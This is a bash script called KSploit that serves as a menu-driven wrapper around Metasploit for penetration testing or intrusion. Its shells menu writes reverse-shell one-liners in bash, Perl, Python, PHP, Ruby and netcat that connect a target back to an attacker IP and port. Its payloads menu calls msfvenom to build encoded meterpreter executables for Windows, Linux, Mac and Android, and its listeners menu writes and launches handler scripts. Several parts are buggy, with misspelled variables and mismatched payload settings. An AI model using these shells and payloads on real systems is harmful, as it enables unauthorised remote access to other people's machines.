#!/bin/bash
# Script: kaos v 0.1
# Author: kaotickj
# Website: kdgwebsolutions.com


#########################################
#----------------- VARS ----------------#
#########################################
# -H = $HOST = host
# -i = $IP = ip
# -o = $OUTPUT = output file

###########################################
#---------------  Colors  ----------------#
###########################################

C=$(printf '\033')
RED="${C}[1;31m"
SED_RED="${C}[1;31m&${C}[0m"
GREEN="${C}[1;32m"
SED_GREEN="${C}[1;32m&${C}[0m"
YELLOW="${C}[1;33m"
SED_YELLOW="${C}[1;33m&${C}[0m"
SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
BLUE="${C}[1;34m"
SED_BLUE="${C}[1;34m&${C}[0m"
ITALIC_BLUE="${C}[1;34m${C}[3m"
LIGHT_MAGENTA="${C}[1;95m"
SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
LIGHT_CYAN="${C}[1;96m"
SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
LG="${C}[1;37m" #LightGray
SED_LG="${C}[1;37m&${C}[0m"
DG="${C}[1;90m" #DarkGray
SED_DG="${C}[1;90m&${C}[0m"
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"

################################################################################
# Help                                                                         #
################################################################################
Help()
{
   # Display Help
   clear
   echo
   echo "    ${RED} _  __${LIGHT_MAGENTA} ____       _       _ _   "
   echo "    ${RED}| |/ /${LIGHT_MAGENTA}/ ___| ___ | | ___ (_) |_ "
   echo "    ${RED}| ' /${LIGHT_MAGENTA}\___ \| '_ \| |/ _ \| | __|"
   echo "    ${RED}| . \\${LIGHT_MAGENTA} ___) | |_) | | (_) | | |_ "
   echo "    ${RED}|_|\_\\${LIGHT_MAGENTA}____/| .__/|_|\___/|_|\__|"
   echo "    ${RED}       ${LIGHT_MAGENTA}    |_|                  "
   echo "       ${GREEN}   🕵🔎 By KaotickJ 👽 " 
   #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
   echo 
   echo "${ITALIC_BLUE}#             HELP MENU               #"
   echo "${BLUE}KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits."
   echo
   echo "${LIGHT_MAGENTA}Syntax: ksploit.sh [-h|-L|-S|-m|-p]"
   echo ${GREEN}
   echo "options:"
   echo "-------------------------------------------"
   echo "${YELLOW}-h ${BLUE}To show this message"
   echo "${YELLOW}-L ${BLUE}To load the listeners menu."
   echo "${YELLOW}-S ${BLUE}To load the shells menu"
   echo "${YELLOW}-m ${BLUE}To start Msfconsole"
   echo "${YELLOW}-p ${BLUE}To load the persistence menu."
   echo 
   echo 
}

################################################################################
# Shells Menu
################################################################################
shells()
{    
	clear
	echo ${YELLOW}"
	 ____  _          _ _     
	/ ___|| |__   ___| | |___ 
	\___ \| '_ \ / _ \ | / __|
	 ___) | | | |  __/ | \__ \\
	|____/|_| |_|\___|_|_|___/
	 🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚                          
	"
        echo "     if you need an advanced php shell, go here:    "
        echo "https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell"
        echo "${BLUE}-----------------------------------------------------"
        echo "${BLUE}          💰       Crafting Shells       💰          "
        echo "${BLUE}-----------------------------------------------------"
	echo ${YELLOW}
	PS3="${YELLOW}Enter your choice (8=QUIT)" 

	options=("Bash" "Perl" "Python" "Python_3" "PHP" "Ruby" "Netcat" "Quit")
	select opt in "${options[@]}"
	do
	    case $opt in
		"Bash")
    		    touch shell.sh
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    echo -e "#!/bin/bash" > shell.sh
		    echo -e "bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1" >> shell.sh		    
		    echo -e "${DG} - - - -> Bash Shell script saved to $wdir/shell.sh"${GREEN}
		    echo -e "or run ${LIGHT_CYAN}bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1${GREEN} on the target machine"
		    ;;
		"Perl")
    		    touch shell.pl
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    echo -e "perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" > shell.pl
		    echo -e "${DG} - - - -> Perl Shell script saved to $wdir/shell.pl"${GREEN}
		    echo -e "or run ${LIGHT_CYAN}perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${GREEN} on the target machine"
		    ;;
		"Python")
    		    touch shell.py
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > shell.py
		    echo -e "${DG} - - - -> Python Shell script saved to $wdir/shell.py"${GREEN}
		    echo -e "or run ${LIGHT_CYAN}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine"
		    ;;
		"Python_3")
    		    touch shell3.py
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    echo -e "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > shell3.py
		    echo -e "${DG} - - - -> Python3 Shell script saved to $wdir/shell3.py"${GREEN}
		    echo -e "or run ${LIGHT_CYAN}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine"
		    ;;
		"PHP") 
    		    touch shell.php
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    echo -e "php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" > shell.php
		    echo -e "${DG} - - - -> PHP Shell script saved to $wdir/shell.php"${GREEN}
		    echo -e "or run ${LIGHT_CYAN}php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${GREEN} on the target machine"
		    echo "${LIGHT_MAGENTA}     if you need an advanced php shell, go here:    "
		    echo "https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}"
		    ;; 
	        "Ruby")
	            touch shell.rb
       		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" > shell.rb
		    echo -e "${DG} - - - -> Ruby Shell script saved to $wdir/shell.rb"${GREEN}
		    echo -e "or run ${LIGHT_CYAN}ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${GREEN} on the target machine"
	            ;;					    
		 "Netcat") 
		    touch netcat.sh
       		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    echo -e "nc -e /bin/sh $attackeip $attackeport" > netcat.sh
		    echo -e "${DG} - - - -> Bash Shell script saved to $wdir/netcat.sh ((RUN WITH ./netcat.sh on the target))"${GREEN}
		    echo -e "or run ${LIGHT_CYAN}nc -e /bin/sh $attackeip $attackeport ${GREEN}on the target machine"
		    ;;
		 #JAVA) r = Runtime.getRuntime()
#			p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
#			p.waitFor()
		"Quit")
	 	    clear		
		    echo "Good Bye" && break
		    ;;
		*) echo 💀 invalid option 💀;;
	    esac
	done
}

#	echo -e "   1.)  💰 Craft a payload"
#	echo -e "   2.)  👂 Craft a listener"
#	echo -e "   4.)  ⌚ Craft persistence script"
#	echo -e "   5.)  🚪 Quit"

#	read options

#	case "$options" in

#	  "1" | "1" )

payloads()
{
	clear
	echo ${LIGHT_CYAN}'
	 ____             _                 _     
	|  _ \ __ _ _   _| | ___   __ _  __| |___ 
	| |_) / _` | | | | |/ _ \ / _` |/ _` / __|
	|  __/ (_| | |_| | | (_) | (_| | (_| \__ \
	|_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
		    |___/                         
	 💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰	    
		    
 '
        echo "${BLUE}-----------------------------------------------------"
        echo "${BLUE}          💰      Crafting Payloads      💰          "
        echo "${BLUE}-----------------------------------------------------"
        echo ${LIGHT_MAGENTA}
	PS3="${YELLOW}Enter your choice (9=QUIT)" 

	options=("Windows_x86" "Windows_x64" "Linux" " Mac" " Android" "Python" "Meterpreter_x86" "Meterpreter_x64" "Quit")
	select opt in "${options[@]}"
	do
	    case $opt in
		"Windows_x86")
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > shell.exe
		    echo "Generating payload ....."	
		    echo -e "${DG} - - - -> shell.exe saved ${GREEN}"
		    ;;
		"Windows_x64")
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x64/xor -i 10 -f exe > shell.exe
		    echo "Generating payload ....."	
		    echo -e "${DG} - - - -> shell.exe saved ${GREEN}"
		    ;;
		"Linux")
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > shell.elf
		    echo -e "${DG} - - - -> shell.elf saved ${GREEN}"
		    ;;
		"Mac")
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f macho > shell.macho
		    echo "Generating payload ....."	
		    echo -e "${DG} - - - -> shell.macho saved ${GREEN}"
		    ;;
		"Android")
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    msfvenom -p android/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R > ~/Desktop/tmp/shell.apk
		    echo "Generating payload ....."	
		    echo -e "${DG} - - - -> shell.apk saved ${GREEN}"
		    ;;  
		"Python")
		    echo
		    echo "${DG} - - - -> set payload cmd/unix/reverse_python"
		    echo ${GREEN}
		    read -p 'Enter Attack box IP* ' attackerip
		    echo "${DG} - - - -> set LHOST="$attackerip
		    echo ${GREEN}
		    read -p 'Enter Attack box Port* ' attackerport
		    echo "${DG} - - - -> set LPORT="$attackerport
		    echo ${GREEN}
		    echo "Generating payload ....."	
		    msfvenom -p cmd/unix/reverse_python LHOST=$attackerip LPORT=$attackerport -f raw > shell.py
		    echo -e "${DG} - - - -> shell.py saved ${GREEN}"
		    ;;
		"Meterpreter_x86")
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > shellx86.elf
		    echo -e "${DG} - - - -> shell.elf saved ${GREEN}"
		    ;;
		"Meterpreter_x64")
		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
		    msfvenom -p linux/x64/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > shellx64.elf
		    echo "Generating payload ....."	
		    echo -e "${DG} - - - -> shell.elf saved ${GREEN}"
		    ;;
		"Quit")
	 	    clear		
		    echo "Good Bye" && break
		    ;;
		*) echo 💀 invalid option 💀;;
	    esac
	done
}

listeners()
{
        clear
echo ${LIGHT_CYAN}'
	 _     _     _                           
	| |   (_)___| |_ ___ _ __   ___ _ __ ___ 
	| |   | / __| __/ _ \ '_ \ / _ \ '__/ __|
	| |___| \__ \ ||  __/ | | |  __/ |  \__ \
	|_____|_|___/\__\___|_| |_|\___|_|  |___/
	 👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂

'

        echo "${BLUE}-----------------------------------------------------"
        echo "${BLUE}             👂   Crafting Listeners   👂            "
        echo "${BLUE}-----------------------------------------------------"
        echo ${LIGHT_MAGENTA}
	PS3="${YELLOW}Enter your choice (5=QUIT)" 

	options=("Python" "Meterpreter_x86" "Meterpreter_x64" "Bash" "Quit")
	select opt in "${options[@]}"
do
    case $opt in
        "Python")
            touch meterpreter.rc
            echo use exploit/multi/handler > meterpreter.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> meterpreter.rc
            read -p 'Set Attacker IP* ' attackerip
            echo set LHOST $attackerip >> meterpreter.rc
            read -p 'Set Attacker Port* ' attackerip
            echo set LPORT $attackerip >> meterpreter.rc
            echo set ExitOnSession false >> meterpreter.rc
            echo exploit -j -z >> meterpreter.rc
            cat meterpreter.rc | xterm -e msfconsole -r meterpreter.rc &
            ;;
        "Meterpreter_x86")
            touch meterpreter_linux.rc
            echo use exploit/multi/handler > meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> meterpreter_linux.rc
            read -p 'Set Attacker IP* ' attackerip
            echo set LHOST $attackerip >> meterpreter_linux.rc
            read -p 'Set Attacker Port* ' attackerip
            echo set LPORT $attackerip >> meterpreter_linux.rc
            echo set ExitOnSession false >> meterpreter_linux.rc
            echo exploit -j -z >> meterpreter_linux.rc
            cat meterpreter_linux.rc | xterm -e msfconsole -r meterpreter_linux.rc &
            exit
            ;;
        "Meterpreter_x64")
            touch meterpreter_mac.rc
            echo use exploit/multi/handler > meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> meterpreter_mac.rc
            read -p 'Set Attacker IP* ' attackerip
            echo set LHOST $attackerip >> meterpreter_mac.rc
            read -p 'Set Attacker Port* ' attackerip
            echo set LPORT $attackerip >> meterpreter_mac.rc
            echo set ExitOnSession false >> meterpreter_mac.rc
            echo exploit -j -z >> meterpreter_mac.rc
            cat meterpreter_mac.rc | xterm -e msfconsole -r meterpreter_mac.rc &
            ;;
        "Bash")
            touch meterpreter_droid.rc
            echo use exploit/multi/handler > meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> meterpreter_droid.rc
            read -p 'Set Attacker IP* ' attackerip
            echo set AttLHOST $attackerip >> meterpreter_droid.rc
            read -p 'Set Attacker Port* ' attackerip
            echo set LPORT $attackerip >> meterpreter_droid.rc
            echo set ExitOnSession false >> meterpreter_droid.rc
            echo exploit -j -z >> meterpreter_droid.rc
            cat meterpreter_droid.rc | xterm -e msfconsole -r ~/Desktop/temp/meterpreter_droid.rc &
            ;;  
        "Quit")
            clear
            echo "Good Bye" && break
            ;;
        *) echo 💀 invalid option 💀;;
    esac
done
}                                     

mfconsole()
{
 		sudo msfconsole
}	  

persist()
{
		echo 'Not Ready' 
}

#}

################################################################################
################################################################################
# Main program                                                                 #
################################################################################
################################################################################

[[ `id -u` -eq 0 ]] || { echo -e "${RED}💀 Must run as root (sudo ./ksploit.sh) 💀"; exit 1; }
resize -s 30 60
clear
SERVICE=service;
wdir=$(pwd)
clear
   clear
   echo
   echo "    ${RED} _  __${LIGHT_MAGENTA} ____       _       _ _   "
   echo "    ${RED}| |/ /${LIGHT_MAGENTA}/ ___| ___ | | ___ (_) |_ "
   echo "    ${RED}| ' /${LIGHT_MAGENTA}\___ \| '_ \| |/ _ \| | __|"
   echo "    ${RED}| . \\${LIGHT_MAGENTA} ___) | |_) | | (_) | | |_ "
   echo "    ${RED}|_|\_\\${LIGHT_MAGENTA}____/| .__/|_|\___/|_|\__|"
   echo "    ${RED}       ${LIGHT_MAGENTA}    |_|                  "
   echo "       ${GREEN}   🕵🔎 By KaotickJ 👽 " 
   #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
   echo 
   echo "${ITALIC_BLUE}#             HELP MENU               #"
   echo "${BLUE}KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits."
   echo
   echo "${LIGHT_MAGENTA}Syntax: ksploit.sh [-h|-L|-S|-m|-p]"
   echo ${GREEN}
   echo "options:"
   echo "-------------------------------------------"
   echo "${YELLOW}-h ${BLUE}To show this message"
   echo "${YELLOW}-L ${BLUE}To load the listeners menu."
   echo "${YELLOW}-S ${BLUE}To load the shells menu"
   echo "${YELLOW}-m ${BLUE}To start Msfconsole"
   echo "${YELLOW}-p ${BLUE}To load the persistence menu."
   echo 
   echo 

while getopts ":h?l?:s?:m?:p?:P?" opt; 
do
  case "$opt" in
       h) Help
         exit;;
       l) listeners
         ;;
       s) shells
         ;;
       m) mfconsole
         ;;
       p) persist
         ;;
       P) payloads
         ;;
       *) 
         echo ${RED}
         echo "💀 invalid option ./ksploit.sh -h for help 💀"
         exit;;
    esac
done
tput sgr0 
